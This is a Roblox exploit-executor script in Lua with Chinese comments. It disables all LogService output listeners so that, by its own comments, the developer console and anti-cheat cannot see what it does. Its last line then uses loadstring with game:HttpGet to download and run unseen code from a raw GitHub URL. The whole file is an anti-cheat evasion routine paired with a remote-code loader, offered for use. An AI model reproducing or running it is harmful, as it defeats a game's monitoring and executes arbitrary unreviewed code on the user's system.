-- 1. 安全获取当前环境和执行器特有的 getconnections 函数
local Env = getfenv()
local getconnections = Env.getconnections or (typeof(getgenv) == "function" and getgenv().getconnections) or getconnections

-- 2. 安全获取 LogService 服务，防止游戏引擎或执行器环境未准备好时崩溃
local success, LogService = pcall(function() 
    return game:GetService("LogService") 
end)

-- 3. 定义核心清理逻辑
local function cleanupConnections()
    -- 确保 getconnections 和 LogService 都存在才继续，否则直接静默跳过，绝不报错
    if not getconnections or not success or not LogService then 
        return 
    end
    
    pcall(function()
        -- 使用 "MessageOut" 字符串进行安全索引
        local MessageOut = "MessageOut"
        local cons = getconnections(LogService[MessageOut])
        
        if cons then
            for _, v in pairs(cons) do
                -- 核心禁用操作，包裹 pcall 防止单个连接无权限或已失效导致中断
                pcall(function() 
                    if v.Disable then
                        v:Disable() 
                    elseif v.Disconnect then
                        v:Disconnect()
                    end
                end)
            end
        end
    end)
end

-- 4. 执行清理
cleanupConnections()

-- 5. 最终输出（由于已经安全断开监听，这里的 print 不会被原生的 F9 和反作弊收到）
pcall(function()
    print("✅ 环境净化完成，LogService 干扰已禁用")
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/ylt410/roblox-Script/refs/heads/main/beta1.8.6"))()
